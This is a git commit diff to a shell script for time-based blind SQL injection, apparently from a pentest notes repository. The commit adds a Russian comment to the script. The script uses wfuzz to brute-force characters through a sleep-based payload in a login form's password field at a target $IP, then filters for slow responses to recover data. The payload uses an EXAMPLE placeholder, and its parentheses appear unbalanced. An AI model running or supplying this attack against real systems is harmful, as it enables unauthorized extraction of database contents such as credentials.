0e5d201b850d6a15e346c1c8a20745e690ef2eba
Arogek <56154090+aroggek@users.noreply.github.com>
2024-02-06 11:49:40 +0300

    Update time_based_blind_SQLi.sh

--- SQLi/time_based_blind_SQLi.sh
+++ SQLi/time_based_blind_SQLi.sh
@@ -3,6 +3,7 @@ for i in $(seq 1 20);
 do wfuzz -v -c -z range,32-127 -d "login=admin&passwd=admin' and IF(ascii(substring((EXAMPLE))=FUZZ, sleep(5),0)#&submit=work" http://$IP
 #Указать название файла (в примере db_xxe4), куда будет сохранен вывод. db_xxe4_1 - отфильтрованный вывод. Это название нужно вставить в переменную "filename".
 done > db_xxe4 && grep -F "5." db_xxe4 >> db_xxe4_1
+#Ищем те значения, где время ответа больше 5 секунд
 grep -F "5." db_xxe4
 #Указываем файл
 filename="db_xxe4_1"
